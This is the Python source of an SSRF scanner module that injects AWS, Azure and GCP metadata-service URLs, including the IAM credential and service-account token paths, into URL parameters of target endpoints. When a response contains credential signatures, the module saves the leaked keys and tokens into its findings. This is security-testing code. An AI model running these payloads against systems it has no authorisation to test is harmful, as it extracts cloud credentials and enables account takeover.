import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import re
from urllib.parse import urlparse, urljoin

class SSRFScanner:
    """
    Expert SSRF Scanner targeting Cloud Metadata Services (IMDS).
    Checks for AWS, Azure, and GCP sensitive metadata leakage.
    """
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        self.metadata_payloads = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        }
        
        # Common vulnerable parameters for SSRF
        self.ssrf_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redir', 'redirect', 
            'to', 'link', 'callback', 'feed', 'val', 'validate', 'proxy', 'file'
        ]

    def _test_url(self, base_url, param, payload, baseline_text="", logger=None):
        """Helper to test a single parameter with a payload, compared to baseline."""
        try:
            test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={payload}"
            r = http_client.get(test_url, options=getattr(self, "options", None), timeout=5, allow_redirects=True)
            
            if r.status_code != 200:
                return False, None, None, None
                
            ctype = r.headers.get("Content-Type", "").lower()
            if "text" not in ctype and "json" not in ctype:
                return False, None, None, None

            # 1. Check if the response is identical to the baseline (parameter ignored)
            if r.text == baseline_text:
                return False, None, None, None

            # 2. Header Validation (Highest Confidence)
            # AWS IMDSv2, GCP, and Azure use specific headers
            headers_low = {k.lower(): v.lower() for k, v in r.headers.items()}
            if "metadata-flavor" in headers_low and "google" in headers_low["metadata-flavor"]:
                return True, r, test_url, payload
            if "x-ms-metadata-status" in headers_low:
                return True, r, test_url, payload

            # 3. Strict Signatures for success
            # Markers that are unlikely to be in a simple reflected payload
            signatures = {
                "aws": ["ami-id", "instance-id", "local-hostname", "security-groups"],
                "aws_iam": ["AccessKeyId", "SecretAccessKey", "Token"],
                "gcp": ["\"access_token\":", "\"expires_in\":", "\"token_type\":"],
                "azure": ["\"compute\":", "\"network\":", "\"vmId\":"]
            }
            
            # 4. Anti-Reflection Check
            # If the payload is reflected in the body, its components shouldn't be counted as signatures
            # unless they are part of a larger valid metadata structure.
            body_text = r.text
            for cloud, sigs in signatures.items():
                for sig in sigs:
                    if sig in body_text and sig not in baseline_text:
                        # Verify it's not JUST reflecting the 'sig' from our payload
                        # (e.g. if we sent it in the URL and it's in a hidden input)
                        if sig in payload:
                            # If sig is in payload, we need ANOTHER sig or a header to be sure
                            other_sigs = [s for s in sigs if s != sig]
                            if any(s in body_text and s not in baseline_text for s in other_sigs):
                                return True, r, test_url, payload
                        else:
                            # Signature found and NOT in our payload -> High confidence SSRF
                            return True, r, test_url, payload
                            
        except Exception:
            pass
        return False, None, None, None

    def scan_endpoints(self, discovered_urls, logger=None):
        findings = []
        if not discovered_urls:
            return findings

        if logger: logger(f"SSRF Expert: Probing {len(discovered_urls)} endpoints for Cloud Metadata Leakage...", "INFO")

        tested_bases = {} # base_url -> baseline_text

        for url in discovered_urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            if base not in tested_bases:
                try:
                    # Fetch baseline once per unique endpoint
                    b_resp = http_client.get(base, options=getattr(self, "options", None), timeout=5)
                    tested_bases[base] = b_resp.text if b_resp.status_code == 200 else ""
                except:
                    tested_bases[base] = ""
            
            baseline_text = tested_bases[base]

            # Check if URL already has suspicious parameters
            query_params = parsed.query.split('&')
            params_to_test = []
            
            for p_pair in query_params:
                if '=' in p_pair:
                    p_name = p_pair.split('=')[0]
                    if p_name.lower() in self.ssrf_params:
                        params_to_test.append(p_name)
            
            if not params_to_test:
                params_to_test = ['url', 'dest', 'path', 'uri']

            for param in params_to_test:
                for cloud, payload in self.metadata_payloads.items():
                    hit, resp, vuln_url, p_val = self._test_url(base, param, payload, baseline_text, logger)
                    
                    if hit:
                        severity = "critical"
                        title = f"CRITICAL: SSRF Cloud Metadata Leak ({cloud.upper()})"
                        desc = f"Vulnerable Endpoint: `{vuln_url}`\n\nIdentified a Server-Side Request Forgery vulnerability that allows access to internal Cloud Metadata Services. "
                        
                        if "SecretAccessKey" in resp.text or "access_token" in resp.text:
                            title = f"💣 EXPLOITABLE: SSRF {cloud.upper()} Credentials Leaked"
                            desc += "\n\n**CRITICAL**: Temporary security credentials (tokens/keys) were extracted from the metadata service."

                        # Build evidence
                        req_dump = f"GET {vuln_url} HTTP/1.1\nHost: {parsed.netloc}\n"
                        res_dump = f"HTTP/1.1 {resp.status_code} {resp.reason}\n"
                        for k, v in resp.headers.items():
                            res_dump += f"{k}: {v}\n"
                        res_dump += f"\n{resp.text[:1000]}..."

                        from scan_engine.helpers.finding_normalizer import FindingNormalizer
                        findings.append(FindingNormalizer.from_response(
                            resp,
                            title=title,
                            description=desc,
                            severity=severity,
                            confidence="high",
                            tool_source="ssrf_expert",
                            category="ssrf",
                            payload=p_val,
                            method="GET",
                            metadata={
                                "loot_type": "Cloud Credentials" if "AccessKeyId" in resp.text else "Instance Metadata"
                            }
                        ))
                        
                        if logger: logger(f"🔥 SSRF BREACH: {cloud.upper()} metadata exposed on {base}", "CRITICAL")
                        break # Found one cloud on this param, move to next param
        
        return findings
